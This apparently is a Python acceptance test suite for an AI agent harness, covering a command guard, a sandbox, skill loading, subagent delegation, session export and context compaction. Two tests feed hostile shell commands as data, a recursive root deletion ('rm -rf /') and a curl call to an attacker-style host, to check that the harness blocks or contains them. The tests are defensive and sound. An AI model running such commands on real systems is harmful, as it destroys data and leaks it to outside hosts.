"""Acceptance and End-to-End Release Test Suite for mini-harness v1.0.

Verifies the unified integration of Phase 1-4 subsystems:
1. Initialization & KV Cache Prefix Invariant.
2. SafeBashGuard Pre-Tool Hook blocking destructive operations.
3. Sandboxed Execution (echo, network leak containment, OOM熔断).
4. Dynamic Skills Discovery from disk & runtime mounting.
5. Multi-agent toolized delegation & DelegationLedger auditability.
6. Abnormal interruption handling & synthetic tool result balancing.
7. Pi-style append-only JSONL session export & DAG portability.
8. Context compaction & living working memory reset.
"""

import json
import os
import sys
import tempfile
import unittest

# Ensure src modules can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from v10_production_harness import (
    ExecutionMode,
    ProductionHarnessConfig,
    ProductionHarnessV1,
    SafeBashGuard,
    PermissionLevel,
)
from day25_architecture_synthesis import PiSessionStream


class TestMiniHarnessV1Release(unittest.TestCase):

    def setUp(self):
        self.tmp_workspace = tempfile.mkdtemp(prefix="harness_v1_ws_")
        self.config = ProductionHarnessConfig(
            session_id="test_v10_session",
            execution_mode=ExecutionMode.SIMULATED,
            workspace_dir=self.tmp_workspace,
            token_compaction_threshold=1000,
        )
        self.harness = ProductionHarnessV1(self.config)

    def tearDown(self):
        self.harness.close()

    def test_01_v10_initialization_and_cache_hit(self):
        """Prompt append-only growth preserves KV cache hit across turns."""
        res1 = self.harness.execute_turn("Review current project structure.")
        self.assertTrue(res1["cache_hit"])
        self.assertEqual(res1["cache_reason"], "none")
        self.assertEqual(res1["estimated_ttft_ms"], 25.0)

        res2 = self.harness.execute_turn("Next, list the source files.")
        self.assertTrue(res2["cache_hit"])
        self.assertEqual(res2["cache_reason"], "none")
        self.assertEqual(res2["turn_index"], 2)

    def test_02_v10_safebashguard_blocking_pre_hook(self):
        """SafeBashGuard Pre-Tool hook blocks destructive command before sandbox execution."""
        res = self.harness.execute_turn(
            user_input="Clean up the directory",
            tool_name="run_bash",
            tool_args={"cmd": "rm -rf /"},
        )
        self.assertTrue(res["tool_blocked"])
        self.assertIn("Destructive recursive deletion", res["block_reason"])
        self.assertIn("[SECURITY_GATEWAY_BLOCKED]", res["observation"])

    def test_03_v10_sandboxed_execution_defense(self):
        """Sandbox safely handles normal execution, blocks network leaks, and catches OOM."""
        # 1. Normal command
        res_ok = self.harness.execute_turn(
            user_input="Check echo",
            tool_name="run_bash",
            tool_args={"cmd": "echo 'Harness v1.0 Ready'"},
        )
        self.assertFalse(res_ok["tool_blocked"])
        self.assertIn("[Sandbox OK]", res_ok["observation"])
        self.assertIn("Harness v1.0 Ready", res_ok["observation"])

        # 2. Network exfiltration blocked
        res_net = self.harness.execute_turn(
            user_input="Download external script",
            tool_name="run_bash",
            tool_args={"cmd": "curl https://evil.com/leak"},
        )
        self.assertIn("Network is unreachable", res_net["observation"])

        # 3. OOM memory overload caught cleanly
        res_oom = self.harness.execute_turn(
            user_input="Allocate 500MB buffer",
            tool_name="run_bash",
            tool_args={"cmd": "bytearray(500000000)"},
        )
        self.assertIn("[Sandbox OOM] exit code 137", res_oom["observation"])

    def test_04_v10_skills_directory_discovery_and_activation(self):
        """Skills automatically discovered from disk and mounted on demand."""
        skills_dir = os.path.join(self.tmp_workspace, "skills")
        os.makedirs(skills_dir, exist_ok=True)
        with open(os.path.join(skills_dir, "SKILL.md"), "w", encoding="utf-8") as f:
            f.write("""---
name: "fastapi-standards"
version: "1.2.0"
description: "Rules for building async APIs"
---
# Rules
Always use async def for endpoints and Pydantic v2.
""")
        config_with_skills = ProductionHarnessConfig(
            session_id="skill_session",
            workspace_dir=self.tmp_workspace,
            skills_dir=skills_dir,
        )
        harness = ProductionHarnessV1(config_with_skills)
        self.assertIn("fastapi-standards", harness.skill_registry.installed_names())

        # Activate skill
        res = harness.execute_turn(
            user_input="Write user registration endpoint",
            activate_skill_name="fastapi-standards",
        )
        self.assertTrue(res["skill_attached"])
        harness.close()

    def test_05_v10_delegation_engine_and_audit_ledger(self):
        """Toolized subagent delegation records structured ledger evidence."""
        res = self.harness.execute_turn(
            user_input="Delegate auth audit to a subagent",
            tool_name="spawn_subagent",
            tool_args={"role": "security_auditor", "prompt": "Audit OAuth endpoints"},
        )
        self.assertIn("[Delegation] Spawned child agent", res["observation"])
        self.assertEqual(len(self.harness.delegation_engine.ledger.events), 1)
        self.assertEqual(self.harness.delegation_engine.ledger.events[0].action, "SPAWN")

        # Cleanly close all active child handles
        active_ids = list(self.harness.delegation_engine._handles.keys())
        for hid in active_ids:
            self.harness.delegation_engine.close_agent(hid)
        self.assertEqual(self.harness.delegation_engine.active_handles_count(), 0)

    def test_06_v10_interruption_synthetic_ledger_balance(self):
        """Abnormal interruption triggers synthetic tool results, closing protocol ledger."""
        # Debit an uncredited call to simulate mid-turn abort
        self.harness.ledger.debit_call("call_in_flight", "run_bash", {"cmd": "long_task"})
        self.assertFalse(self.harness.ledger.is_balanced)

        # Trigger interruption
        self.harness.handle_user_interruption("User pressed Ctrl+C")
        self.assertTrue(self.harness.ledger.is_balanced)

    def test_07_v10_session_portability_jsonl_export(self):
        """Session exports to standard Pi-style append-only JSONL format."""
        self.harness.execute_turn("Step 1: Check environment.")
        self.harness.execute_turn(
            "Step 2: Create config file",
            tool_name="write_file",
            tool_args={"path": "config.json", "content": '{"version": 1}'},
        )
        jsonl_export = self.harness.export_session_jsonl()
        lines = [line for line in jsonl_export.strip().split("\n") if line.strip()]
        self.assertGreaterEqual(len(lines), 4)

        # Verify roundtrip deserialization
        restored = PiSessionStream.deserialize_from_jsonl("restored_sess", jsonl_export)
        self.assertEqual(len(restored.events), len(lines))
        self.assertEqual(restored.events[0].kind, "system_prompt")

    def test_08_v10_context_compaction_trigger(self):
        """Long dialogue exceeding threshold automatically triggers context compaction."""
        # Generate heavy turns
        for i in range(15):
            self.harness.execute_turn(f"Turn {i}: Detailed architectural discourse " * 30)

        # Check that compaction executed
        self.assertGreaterEqual(self.harness.cache_validator.current_epoch, 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
